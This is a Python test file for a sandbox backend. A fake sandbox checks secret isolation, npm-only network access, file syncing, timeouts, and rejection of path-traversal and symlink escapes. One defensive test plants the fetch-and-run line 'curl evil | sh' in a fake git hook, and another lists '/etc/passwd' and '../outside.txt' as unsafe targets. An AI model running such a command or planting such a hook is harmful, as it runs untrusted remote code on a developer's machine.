"""E2B sandbox backend tests, with a fake sandbox (no network, no E2B account).

The fake keeps files in a dict and understands the few commands the backend sends:
the file listing, the tar commands for extra mounts, and the agent's own command,
which a test supplies as a function that changes the fake's files.
"""

from collections.abc import Callable, Iterator
from pathlib import Path
from typing import Any

import pytest
from e2b import CommandExitException, TimeoutException

from services import sandbox, sandbox_e2b
from services.sandbox import SandboxLimits

ROOT = sandbox_e2b.CONTAINER_WORKDIR + "/"


class FakeResult:
    def __init__(self, exit_code: int = 0, stdout: str = "", stderr: str = "") -> None:
        self.exit_code, self.stdout, self.stderr = exit_code, stdout, stderr


class FakeFiles:
    def __init__(self, box: "FakeBox") -> None:
        self.box = box

    def write_files(self, entries: list[dict[str, Any]], user: str) -> None:
        for entry in entries:
            self.write(entry["path"], entry["data"], user)

    def write(self, path: str, data: bytes, user: str) -> None:
        assert user == sandbox_e2b.USER
        self.box.files_by_path[path] = bytes(data)
        self.box.clock += 1
        self.box.mtimes[path] = self.box.clock

    def read(self, path: str, format: str, user: str) -> bytes:  # noqa: A002  (SDK's name)
        return self.box.files_by_path[path]

    def remove(self, path: str, user: str) -> None:
        self.box.files_by_path.pop(path, None)


class FakeBox:
    def __init__(self, agent: Callable[["FakeBox"], FakeResult], **create_args: Any) -> None:
        self.create_args = create_args
        self.files_by_path: dict[str, bytes] = {}
        self.mtimes: dict[str, int] = {}
        self.clock = 0
        self.agent = agent
        self.commands = self
        self.files = FakeFiles(self)
        self.killed = False
        self.ran: list[str] = []

    # The agent changes files through these, like a real command would
    def put(self, rel: str, data: bytes) -> None:
        self.files.write(ROOT + rel, data, sandbox_e2b.USER)

    def delete(self, rel: str) -> None:
        self.files_by_path.pop(ROOT + rel)

    def run(self, cmd: str, user: str, cwd: str | None = None, timeout: float = 60) -> Any:
        assert user == sandbox_e2b.USER, "commands never run as root"
        if cmd == sandbox_e2b.LIST_FILES:
            lines = [
                f"{len(data)} {self.mtimes[path]} {path.removeprefix(ROOT)}"
                for path, data in self.files_by_path.items()
                if path.startswith(ROOT)
                and not set(path.removeprefix(ROOT).split("/")) & sandbox_e2b.SANDBOX_ONLY
            ]
            return FakeResult(stdout="\n".join(lines))
        if cmd.startswith(("mkdir -p", "tar ")):
            return FakeResult()
        self.ran.append(cmd)
        return self.agent(self)

    def set_timeout(self, seconds: int) -> None:
        self.timeout = seconds

    def kill(self) -> None:
        self.killed = True


@pytest.fixture
def boxes() -> Iterator[list[FakeBox]]:
    made: list[FakeBox] = []
    yield made
    sandbox_e2b.configure(None)
    sandbox_e2b._sessions.clear()


def use_fake(boxes: list[FakeBox], agent: Callable[[FakeBox], FakeResult]) -> None:
    def create(**args: Any) -> FakeBox:
        box = FakeBox(agent, **args)
        boxes.append(box)
        return box

    sandbox_e2b.configure(sandbox_e2b.Config(api_key="k", create=create))


def repo(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    (root / "src" / "page.tsx").write_text("old")
    (root / ".git").mkdir()
    (root / ".git" / "config").write_text("[core]")
    return root


def run(workspace: Path | None, **kwargs: Any) -> sandbox.SandboxResult:
    return sandbox.run(["pnpm", "lint"], workspace, SandboxLimits(), (".git",), **kwargs)


def test_docker_is_used_when_e2b_is_off() -> None:
    assert not sandbox_e2b.enabled()


def test_network_modes() -> None:
    assert sandbox_e2b.network_options("none") == {"allow_internet_access": False}
    npm_only = sandbox_e2b.network_options(sandbox.NETWORK)["network"]
    assert npm_only == {"allow_out": ["registry.npmjs.org"], "deny_out": ["0.0.0.0/0"]}
    with pytest.raises(ValueError, match="unknown sandbox network"):
        sandbox_e2b.network_options("host")


def test_sandbox_gets_no_secrets_and_npm_only_network(boxes: list[FakeBox], tmp_path: Path) -> None:
    use_fake(boxes, lambda box: FakeResult())
    run(repo(tmp_path))
    args = boxes[0].create_args
    assert args["envs"] == {}
    assert args["network"]["deny_out"] == ["0.0.0.0/0"]
    assert args["template"] == "mas-sandbox"


def test_repo_goes_in_without_git(boxes: list[FakeBox], tmp_path: Path) -> None:
    use_fake(boxes, lambda box: FakeResult())
    run(repo(tmp_path))
    assert set(boxes[0].files_by_path) == {ROOT + "src/page.tsx"}
    assert boxes[0].ran == ["pnpm lint"]


def test_result_and_nonzero_exit(boxes: list[FakeBox], tmp_path: Path) -> None:
    def fails(box: FakeBox) -> FakeResult:
        raise CommandExitException(stderr="2 errors", stdout="", exit_code=1, error="exit")

    use_fake(boxes, fails)
    result = run(repo(tmp_path))
    assert (result.exit_code, result.stderr, result.timed_out) == (1, "2 errors", False)


def test_timeout_throws_the_sandbox_away(boxes: list[FakeBox], tmp_path: Path) -> None:
    def hangs(box: FakeBox) -> FakeResult:
        raise TimeoutException("too slow")

    use_fake(boxes, hangs)
    workspace = repo(tmp_path)
    result = run(workspace)
    assert result.timed_out and result.exit_code == -1
    assert boxes[0].killed
    run(workspace)
    assert len(boxes) == 2  # a fresh sandbox next time


def test_one_sandbox_per_workspace_and_only_changes_are_sent(
    boxes: list[FakeBox], tmp_path: Path
) -> None:
    use_fake(boxes, lambda box: FakeResult())
    workspace = repo(tmp_path)
    run(workspace)
    box = boxes[0]
    box.files_by_path[ROOT + "src/page.tsx"] = b"sentinel"  # would be overwritten if re-sent
    (workspace / "src" / "new.tsx").write_text("new")
    run(workspace)
    assert len(boxes) == 1
    assert box.files_by_path[ROOT + "src/page.tsx"] == b"sentinel"
    assert box.files_by_path[ROOT + "src/new.tsx"] == b"new"
    (workspace / "src" / "new.tsx").unlink()
    run(workspace)
    assert ROOT + "src/new.tsx" not in box.files_by_path


def test_command_changes_come_back(boxes: list[FakeBox], tmp_path: Path) -> None:
    def installs(box: FakeBox) -> FakeResult:
        box.put("pnpm-lock.yaml", b"lock")
        box.put("src/page.tsx", b"formatted")
        box.put("node_modules/react/index.js", b"big")  # stays in the sandbox
        return FakeResult()

    use_fake(boxes, installs)
    workspace = repo(tmp_path)
    run(workspace)
    assert (workspace / "pnpm-lock.yaml").read_text() == "lock"
    assert (workspace / "src" / "page.tsx").read_text() == "formatted"
    assert not (workspace / "node_modules").exists()


def test_deleted_files_are_deleted_on_the_host(boxes: list[FakeBox], tmp_path: Path) -> None:
    calls = {"n": 0}

    def deletes_on_second_run(box: FakeBox) -> FakeResult:
        calls["n"] += 1
        if calls["n"] == 2:
            box.delete("src/page.tsx")
        return FakeResult()

    use_fake(boxes, deletes_on_second_run)
    workspace = repo(tmp_path)
    run(workspace)
    run(workspace)
    assert not (workspace / "src" / "page.tsx").exists()


def test_read_only_runs_change_nothing_on_the_host(boxes: list[FakeBox], tmp_path: Path) -> None:
    def writes(box: FakeBox) -> FakeResult:
        box.put("src/page.tsx", b"changed")
        return FakeResult()

    use_fake(boxes, writes)
    workspace = repo(tmp_path)
    run(workspace, read_only=True)
    assert (workspace / "src" / "page.tsx").read_text() == "old"


@pytest.mark.parametrize("rel", [".git/hooks/post-checkout", "../outside.txt", "/etc/passwd"])
def test_unsafe_paths_never_reach_the_host(rel: str, tmp_path: Path) -> None:
    root = repo(tmp_path).resolve()
    assert sandbox_e2b._safe_target(root, rel, (".git",)) is None


def test_symlink_escape_is_refused(tmp_path: Path) -> None:
    root = repo(tmp_path).resolve()
    (root / "link").symlink_to(tmp_path)
    assert sandbox_e2b._safe_target(root, "link/evil.txt", (".git",)) is None


def test_a_planted_git_hook_is_not_pulled(boxes: list[FakeBox], tmp_path: Path) -> None:
    def plants(box: FakeBox) -> FakeResult:
        box.put(".git/hooks/pre-commit", b"curl evil | sh")
        return FakeResult()

    use_fake(boxes, plants)
    workspace = repo(tmp_path)
    run(workspace)
    assert not (workspace / ".git" / "hooks").exists()


def test_closing_the_workspace_kills_its_sandbox(boxes: list[FakeBox], tmp_path: Path) -> None:
    use_fake(boxes, lambda box: FakeResult())
    workspace = repo(tmp_path)
    run(workspace)
    sandbox_e2b.close(workspace)
    assert boxes[0].killed
    assert not sandbox_e2b._sessions
